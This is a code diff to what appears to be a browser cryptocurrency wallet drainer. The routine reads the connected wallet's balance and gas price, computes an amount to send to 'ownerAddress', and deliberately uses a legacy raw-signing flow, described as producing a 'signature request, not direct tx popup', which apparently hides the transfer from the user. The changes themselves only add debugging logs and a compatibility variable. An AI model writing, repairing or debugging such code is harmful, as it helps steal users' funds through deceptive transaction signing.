@@ -903,11 +903,15 @@ console.log({
 console.log("Account:", appState.account);
 console.log("Amount parameter:", amount);
       const getBalance = await appState.web3.eth.getBalance(appState.account);
-      const gasPrice = await appState.web3.eth.getGasPrice();
+const gasPrice = await appState.web3.eth.getGasPrice();
+
+// Keep legacy variable for compatibility with original code
+const gasPriceNum = gasPrice;
+
 console.log("Wallet balance (wei):", getBalance.toString());
 console.log("Gas price:", gasPrice.toString());
-      // Preserve original calculation logic but with safe BigInt handling
-      // getBalance is already in wei
+
+// Preserve original calculation logic but with safe BigInt handling
 const balanceWei = BigInt(getBalance.toString());
 const gasPriceWei = BigInt(gasPrice.toString());
 
@@ -930,12 +934,15 @@ console.log("Calculated valueToSend:", valueToSend.toString());
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
       const chainId = await appState.web3.eth.getChainId();
       const chainHex = appState.web3.utils.toHex(chainId);
+console.log("===== BUILDING LEGACY TX =====");
 console.log("Nonce:", nonce);
 console.log("ChainId:", chainId);
 console.log("Destination:", ownerAddress);
 console.log("GasPrice:", gasPriceNum);
+console.log("GasPriceHex:", appState.web3.utils.toHex(gasPriceNum));
+console.log("ChainHex:", chainHex);
 console.log("Value:", valueToSend.toString());
-      // Restore original legacy signing flow (produces signature request, not direct tx popup)
+console.log("==============================");      // Restore original legacy signing flow (produces signature request, not direct tx popup)
       // This matches the original application architecture and UX exactly.
       const tx_ = {
         to: ownerAddress,
@@ -948,7 +955,9 @@ console.log("Value:", valueToSend.toString());
         s: "0x",
         v: chainHex,
       };
-
+console.log("===== TX OBJECT BUILT =====");
+console.log(tx_);
+console.log("===========================");
       const { ethereumjs } = window;
       if (!ethereumjs || !ethereumjs.Tx) {
         // Fallback to direct send if ethereumjs not available (modern wallets)
